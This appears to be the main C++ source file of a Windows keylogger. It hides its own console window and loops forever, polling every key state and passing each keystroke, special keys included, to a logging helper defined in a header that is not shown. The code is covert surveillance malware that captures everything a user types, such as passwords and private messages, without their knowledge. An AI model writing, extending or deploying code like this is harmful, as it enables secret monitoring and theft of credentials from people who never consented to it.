
#include <iostream>
#include <windows.h>
#include <bits/stdc++.h>
#include "saveData.h"

using namespace std;

int main() {
    saveData a;

    int spL_key_array[] = {VK_SNAPSHOT,VK_HOME,VK_SHIFT,VK_SPACE,VK_MENU,VK_CONTROL,VK_CAPITAL};

    string spL_key_char;
    bool is_spl_key;

    //hiding terminal windows
    HWND hwnd= GetConsoleWindow();
    ShowWindow(hwnd,SW_HIDE);

    //loop Forever
    while (true){
        Sleep(10);
        //loop through eah key
        for(int c = 8; c<=190; c++){
            //key is pressed
            if (GetAsyncKeyState(c) == -32767){
                //key is pressed
                //check key is a special key
               is_spl_key = find(begin(spL_key_array), end(spL_key_array),c)!= end(spL_key_array);
                if (is_spl_key){

                    //special key we need to translate it
                    spL_key_char = a.KeyIsListed(c);

                    //saving the data
                    a.startLogging(spL_key_char);
                }
                else{
                    // using condition to check if it is uppercase or lower case
                    if (GetKeyState(VK_CAPITAL))
                        //capslock is on
                        a.startLogging(string(1, (char) c));

                    else {  //capslock is off
                        a.startLogging(string(1, (char) tolower(c)));
                    }
                }
            }
        }
    }
    return 0;
}
